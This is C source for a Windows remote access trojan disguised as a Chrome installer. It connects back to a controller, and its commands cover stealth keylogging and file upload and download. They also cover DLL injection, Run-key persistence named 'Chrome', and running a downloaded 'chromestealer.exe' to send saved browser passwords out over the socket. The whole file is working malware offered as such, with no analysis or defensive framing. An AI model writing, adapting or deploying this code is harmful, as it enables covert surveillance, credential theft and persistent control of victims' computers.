// gcc *file* -o *file* -lws2_32 -lwsock32

#ifdef _WIN32
	char OS[] = "Windows";
#else
	char OS[] = "Unix";
#endif

#include <stdio.h>      
#include <winsock.h>    
#include <stdlib.h>     
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <ctype.h>          
#include <io.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <winsock2.h>
#include <process.h>
#include <tchar.h>





#define RCVBUFSIZE 32   
#define bzero(p, size)     (void)memset((p), 0, (size))
int sock;                        
int port = 0, clilen = 0, n = 0;
int get_keys(void);
int PROCESSID;
char WANIP[32];
long bytes;
STARTUPINFO si;
PROCESS_INFORMATION pi;


int ps(void) {
	char path[1024];
	char filepath[1024];
	getcwd(path, sizeof(path));
	
	system("tasklist > proc.txt");
}


int persist(void) {
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;


	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		return -1;
	}
	
	HKEY NewVal;
	
	if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		return -1;
	}	
	
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Chrome"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		return -1;
	}
	

	RegCloseKey(NewVal);
	return 0;
}
	

int delpersist(void) {

	TCHAR sizPath[MAX_PATH];
	DWORD pathLength = 0;


	pathLength = GetModuleFileName(NULL, sizPath, MAX_PATH);
	if (pathLength == 0) {
		return -1;
	}
	
	HKEY DelVal;
	
	if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\"), &DelVal) != ERROR_SUCCESS) {
		return -1;
	}	
	
	
	LONG KeyVal = 0;
	KeyVal = RegDeleteValue(DelVal,"Chrome");
	if (KeyVal == ERROR_SUCCESS) {
		return 0;
	}
	else {
		return 1;
	        if (KeyVal == ERROR_FILE_NOT_FOUND) {
			return 1;
		}
	}



	RegCloseKey(DelVal);
	return 0;
}



BOOL InjectDLL(DWORD dwProcessId, LPCSTR lpszDLLPath)
{
	HANDLE  hProcess, hThread;
	LPVOID  lpBaseAddr, lpFuncAddr;
	DWORD   dwMemSize, dwExitCode;
	BOOL    bSuccess = FALSE;
	HMODULE hUserDLL;

	if((hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION
		|PROCESS_VM_WRITE|PROCESS_VM_READ, FALSE, dwProcessId)))
	{
		dwMemSize = lstrlen(lpszDLLPath) + 1;
		if((lpBaseAddr = VirtualAllocEx(hProcess, NULL, dwMemSize, MEM_COMMIT, PAGE_READWRITE)))
		{
			if(WriteProcessMemory(hProcess, lpBaseAddr, lpszDLLPath, dwMemSize, NULL))
			{
				if((hUserDLL = LoadLibrary(TEXT("kernel32.dll"))))
				{
					if((lpFuncAddr = GetProcAddress(hUserDLL, TEXT("LoadLibraryA"))))
					{
						if((hThread = CreateRemoteThread(hProcess, NULL, 0, lpFuncAddr, lpBaseAddr, 0, NULL)))
						{
							WaitForSingleObject(hThread, INFINITE);
							if(GetExitCodeThread(hThread, &dwExitCode)) {
								bSuccess = (dwExitCode != 0) ? TRUE : FALSE;
							}
							CloseHandle(hThread);
						}
					}
					FreeLibrary(hUserDLL);
				}
			}
			VirtualFreeEx(hProcess, lpBaseAddr, 0, MEM_RELEASE);
		}
		CloseHandle(hProcess);
	}

	return bSuccess;
}

int WINAPI Check()
{
	char cwd[1024];
	char pathtodll[1024];
	getcwd(cwd, sizeof(cwd));
	strcat(pathtodll, cwd);
	strcat(pathtodll,"LOCAL.dll");	

	if(InjectDLL(PROCESSID, "C:\\Users\\COMPILER\\Desktop\\LOCAL.dll")) {
		send(sock, "[*] DLL Injected Successfully!\n", 1024, 0);
	}
	else {
		send(sock, "[!] DLL Injection Failed!\n", 1024, 0);
	}

	return 0;
}


int WANIPLOCATE()
{
    HINTERNET hInternet, hFile;
    DWORD rSize;

    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hFile = InternetOpenUrl(hInternet, "http://bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    InternetReadFile(hFile, &WANIP, sizeof(WANIP), &rSize);
    WANIP[rSize] = '\0';

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);*/
}   



DWORD WINAPI Keylogger (LPVOID lpParam)
{

    int t=get_keys();
 
    return t;
} 
 
    int get_keys(void)
    {
        short character;
        while(1)
        {
            for(character=8;character<=222;character++)
            {
                if(GetAsyncKeyState(character)==-32767)
                { 
                    FILE *f;
                    f=fopen("svchost.log","a+");
                    if(f==NULL)
                    {
                        return 1;
                    }           
                    if(f!=NULL)
                    {       
                        if((character>=39)&&(character<=64))
                        {
                            fputc(character,f);
                            fclose(f);
                            break;
                        }       
                        else if((character>64)&&(character<91))
                        {
                        character+=32;
                        fputc(character,f);
                        fclose(f);
                        break;
                        }
                        else
                        {
                            switch(character)
                            {
                                case VK_SPACE:
                                fputc(' ',f);
                                fclose(f);
                                break;   
                                case VK_SHIFT:
                                fputs("[SHIFT]",f);
                                fclose(f);
                                break;                                           
                                case VK_RETURN:
                                fputs("\n[ENTER]",f);
                                fclose(f);
                                break;
                                case VK_BACK:
                                fputs("[BACKSPACE]",f);
                                fclose(f);
                                break;
                                case VK_TAB:
                                fputs("[TAB]",f);
                                fclose(f);
                                break;
                                case VK_CONTROL:
                                fputs("[CTRL]",f);
                                fclose(f);
                                break;   
                                case VK_DELETE:
                                fputs("[DEL]",f);
                                fclose(f);
                                break;
                                case VK_OEM_1:
                                fputs("[;:]",f);
                                fclose(f);
                                break;
                                case VK_OEM_2:
                                fputs("[/?]",f);
                                fclose(f);
                                break;
                                case VK_OEM_3:
                                fputs("[`~]",f);
                                fclose(f);
                                break;
                                case VK_OEM_4:
                                fputs("[ [{ ]",f);
                                fclose(f);
                                break;
                                case VK_OEM_5:
                                fputs("[\\|]",f);
                                fclose(f);
                                break;                               
                                case VK_OEM_6:
                                fputs("[ ]} ]",f);
                                fclose(f);
                                break;
                                case VK_OEM_7:
                                fputs("['\"]",f);
                                fclose(f);
                                break;                                           
                                case VK_NUMPAD0:
                                fputc('0',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD1:
                                fputc('1',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD2:
                                fputc('2',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD3:
                                fputc('3',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD4:
                                fputc('4',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD5:
                                fputc('5',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD6:
                                fputc('6',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD7:
                                fputc('7',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD8:
                                fputc('8',f);
                                fclose(f);
                                break;
                                case VK_NUMPAD9:
                                fputc('9',f);
                                fclose(f);
                                break;
                                case VK_CAPITAL:
                                fputs("[CAPS LOCK]",f);
                                fclose(f);
                                break;
                                default:
                                fclose(f);
                                break;
                                }       
                            }   
                        }       
                    }   
                }                 
 
            }
            return EXIT_SUCCESS;   
			return 0;
}                                               
 


int Shell() {
	
	WANIPLOCATE();

	char info[] = "info";
	char times[] = "time";
	char upload[] = "upload";
	char download[] = "download";
	char keylog[] = "keylogger";
	char screenshot[] = "screenshot";
	char inject[] = "inject";
	char close[] = "close";	
	char proc[] = "ps";
	char persistence[] = "persistence";
	char delpersistence[] = "delpersist";
	char chromestealer[] = "chromestealer";

	struct sockaddr_in echoServAddr; 
	unsigned short echoServPort;     
	char *servIP;                    
	char *echoString;                
	char echoBuffer[RCVBUFSIZE];     
	int echoStringLen;               
	int bytesRcvd, totalBytesRcvd;   
	WSADATA wsaData;                 

	int bytesReceived = 0;
	char buffer[4096];
	char recvBuff[4096];
	char filepath[1024];
	bzero(recvBuff, 4096);

        STARTUPINFO ini_processo;
        PROCESS_INFORMATION processo_info;
	DWORD bufCharCount = 32767;
	char infoBuf1[32767];
	char infoBuf2[32767];



	while (1) {

		bzero(buffer, 256);

		n = recv(sock, buffer, 256, 0);

		if (strncmp(buffer, info, strlen(info)) == 0) {

		    GetComputerName(infoBuf1, &bufCharCount);
		    GetUserName(infoBuf2, &bufCharCount);
		    

		    n = send(sock, infoBuf1, 1024, 0);
		    n = send(sock, infoBuf2, 1024, 0);
		    sleep(1);
		    n = send(sock, OS, strlen(OS), 0);
		    sleep(1);
		    n = send(sock, WANIP, strlen(WANIP), 0);	
		    sleep(1);

		}  


		else if (strncmp(buffer, times, strlen(times)) == 0) {
			time_t now;
			time(&now);
			n = send(sock, ctime(&now), strlen(ctime(&now)), 0);
		}



		else if (strncmp(buffer, upload, strlen(upload)) == 0) {
			n = recv(sock, filepath, 1024, 0);
			FILE *fp;
			fp = fopen(filepath, "wb");
			printf(filepath);
			if (NULL == fp) {
				printf("null");
				break;
			}

			while ((bytesReceived = recv(sock, recvBuff, 8192, 0)) > 0) {
		            sleep(1);

			    if (bytesReceived < 12) {
			    	fclose(fp);
				break;
			    }
			    fwrite(recvBuff, 1, bytesReceived, fp);


			}


		}

		else if (strncmp(buffer, download, strlen(download)) == 0) {
		    char filename[1024];

    		    n=recv(sock,filename,1024, 0);
    		    strtok(filename, "\n");

    		    printf(filename);

    		    FILE *fd = fopen(filename, "rb");
    		    if(fd == NULL) {
			send(sock, "Error", 5, 0);
			printf("[!] Error Opening File!");
			break;
    		    }	
    		    sleep(3);
	   

    		    while(1) {
			unsigned char buff[1024] = {0};
        		int nread = fread(buff,1,1024,fd);
        		printf("[*] Bytes Read From File: %d\n", nread);

        		if(nread > 0) {
           		    printf("[*] Sending...\n");
	    		    send(sock, buff, nread, 0);	
	    		    sleep(1);
			}
	
			if (nread < 10) {
            	            if (feof(fd))
	        		printf("[*] File Sent!\n");
				send(sock, "Uploaded", 8, 0);
				break;
	    	    	    if (ferror(fd))
				printf("[!] Error Reading and Sending File!");
	    	    	    break;
			}
			sleep(1);
    		    }
		}



		else if (strncmp(buffer, keylog, strlen(keylog)) == 0) { 
			HANDLE hThread; 
			char timer[1024];
			char logger[1024];
			char svchost[] = "svchost.log";
			n = recv(sock, timer, 1024, 0);
			int timerint = atoi(timer);
			hThread = CreateThread(NULL, 0, Keylogger, NULL, 0, NULL);


			while (1) {
				sleep(timerint);
				TerminateThread(hThread, 0);
				CloseHandle(hThread);
				send(sock,"[*] Keylogger Finished!\n", 1024, 0);
				n = recv(sock, logger, 1024, 0);

		        if (strncmp(logger, "Y", 1) == 0) 
				{

					FILE *logfile;
					logfile = fopen("svchost.log", "r");
					if (logfile == NULL) {
						break;
					}

					while (1) {
						unsigned char buff[1024] = { 0 };
						int nread = fread(buff, 1, 1024, logfile);

						if (nread > 0) {
							send(sock, buff, nread, 0);
						}

						if (nread < 10) {
							if (feof(logfile))
								fclose(logfile);
      							remove(svchost);
							break;
							if (ferror(logfile))
							break;
						}
						sleep(1);
					}
				}
				else {
					break;
				}

			break;
			}
			
		}


		else if (strncmp(buffer, inject, strlen(inject)) == 0) { 

			char PROCESS[1024];
			n = recv(sock, PROCESS, 1024, 0);
			PROCESSID = atoi(PROCESS);
			Check();
		}

		else if (strncmp(buffer, proc, strlen(proc)) == 0) {
		    ps(); 

		    FILE *procfile = fopen("proc.txt", "r");
    		    if(procfile == NULL) {
			send(sock, "Error", 5, 0);
			break;
    		    }	
    		    sleep(3);

    		    while(1) {
			unsigned char buff[4096] = {0};
        		int nread = fread(buff,1,4096,procfile);

        		if(nread > 0) {
	    		    send(sock, buff, nread, 0);	
	    		    sleep(1);
			}
	
			if (nread < 10) {
            	            if (feof(procfile))
				send(sock, "Uploaded", 8, 0);
				fclose(procfile);
      				remove("proc.txt");
				break;
	    	    	    if (ferror(procfile))
	    	    	    break;
			}
			sleep(1);
    		    }
		}


		else if (strncmp(buffer, persistence, strlen(persistence)) == 0) {
		        if (persist() == 0) {
				send(sock, "Added", 5, 0);
			}
			else {
				send(sock, "Failed", 6, 0);
			}
		}

		else if (strncmp(buffer, delpersistence, strlen(delpersistence)) == 0) {
			if (delpersist() == 0) {
				send(sock, "Removed", 7, 0);
			}
			else {
				send(sock, "Failed", 6, 0);
			}
		}

		else if (strncmp(buffer, chromestealer, strlen(chromestealer)) == 0) {
		    	char UploadorNot[1024];
			n = recv(sock, UploadorNot, 1, 0);
			if (strncmp(UploadorNot, "N", 1) == 0) {
			    FILE *chrome;
			    chrome = fopen("chromestealer.exe", "wb");
			    if (NULL == chrome) {
			  	printf("null");
				break;
			    }

			    while ((bytesReceived = recv(sock, recvBuff, 8192, 0)) > 0) {
		                sleep(1);

			        if (bytesReceived < 12) {
			    	    fclose(chrome);
				    break;
			        }
			        fwrite(recvBuff, 1, bytesReceived, chrome);


			    }

                            memset(&si,0,sizeof(si));
                            memset(&pi,0,sizeof(pi));ES:
    			    si.cb = sizeof(si);

    			    si.dwFlags = STARTF_USESHOWWINDOW;
    			    si.wShowWindow = SW_HIDE; 

			    CreateProcess("chromestealer.exe", NULL, 0, 0, 0, 0, 0, 0, &si, &pi);
			    WaitForSingleObject(pi.hProcess,INFINITE);
			    CloseHandle(pi.hProcess);

		    	    FILE *procfile = fopen("pwd.txt", "r");

    		    	    if(procfile == NULL) {
			        send(sock, "Error", 5, 0);
			        break;	
			    }	
    		            sleep(1);

			    while(1) {
			    	unsigned char buff[4096] = {0};
        		    	int nread = fread(buff,1,4096,procfile);

        		    	if(nread > 0) {
	    		   	    send(sock, buff, nread, 0);	
	    		    	    sleep(1);
			        }
	
			        if (nread < 10) {
            	            	    if (feof(procfile))
		       		        send(sock, "Uploaded", 8, 0);
				        fclose(procfile);
      				        remove("pwd.txt");
				        break;
	    	    	    	    if (ferror(procfile))
	    	    	    	        break;
			        }
			    }
			}

			if (strncmp(UploadorNot, "Y", 1) == 0) {
                            memset(&si,0,sizeof(si));
                            memset(&pi,0,sizeof(pi));
    			    si.cb = sizeof(si);

    			    si.dwFlags = STARTF_USESHOWWINDOW;
    			    si.wShowWindow = SW_HIDE; 

			    CreateProcess("chromestealer.exe", NULL, 0, 0, 0, 0, 0, 0, &si, &pi);
			    WaitForSingleObject(pi.hProcess,INFINITE);
			    CloseHandle(pi.hProcess);

		    	    FILE *procfile = fopen("pwd.txt", "r");
    		    	    if(procfile == NULL) {
			        send(sock, "Error", 5, 0);
			        break;	
			    }	
    		            sleep(3);

    		    	    while(1) {
			    	unsigned char buff[4096] = {0};
        		    	int nread = fread(buff,1,4096,procfile);

        		    	if(nread > 0) {
	    		   	    send(sock, buff, nread, 0);	
	    		    	    sleep(1);
			        }
	
			        if (nread < 10) {
            	            	    if (feof(procfile))
		       		        send(sock, "Uploaded", 8, 0);
				        fclose(procfile);
      				        remove("pwd.txt");
				        break;
	    	    	    	    if (ferror(procfile))
	    	    	    	        break;
			        }
			        sleep(1);
			    }
			}

			else {
				printf("fail");
			}
		}


		else if (strncmp(buffer, close, strlen(close)) == 0) { 

			closesocket(sock);
			WSACleanup();
			exit(0);
		}

		else {
		    
                    send(sock, "[!!] Function Not Complete!", 1024, 0);  	
		    
		}

	}
}




int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {

 
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    struct sockaddr_in echoServAddr; 
    unsigned short echoServPort;   
    char *servIP;                    
    char *echoString;               
    char echoBuffer[RCVBUFSIZE];    
    int echoStringLen;              
    int bytesRcvd, totalBytesRcvd;  
    WSADATA wsaData;                 

	int bytesReceived = 0;
	char buffer[4096];
	char recvBuff[4096];
	char filepath[1024];
	bzero(recvBuff, 4096);

 
    DWORD bufCharCount = 32767;    
    char infoBuf1[32767];
    char infoBuf2[32767];
 

    servIP = "127.0.0.1";            
    echoServPort = 4444; 

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) 
    {
        exit(1);
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)


    memset(&echoServAddr, 0, sizeof(echoServAddr));    
    echoServAddr.sin_family      = AF_INET;            
    echoServAddr.sin_addr.s_addr = inet_addr(servIP);  
    echoServAddr.sin_port        = htons(echoServPort); 

    if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
        return 0;


    MessageBox(NULL, TEXT("Chrome Installer Failed!"), TEXT("Chrome Installer"), MB_OK | MB_ICONERROR);
    Shell();

}

   
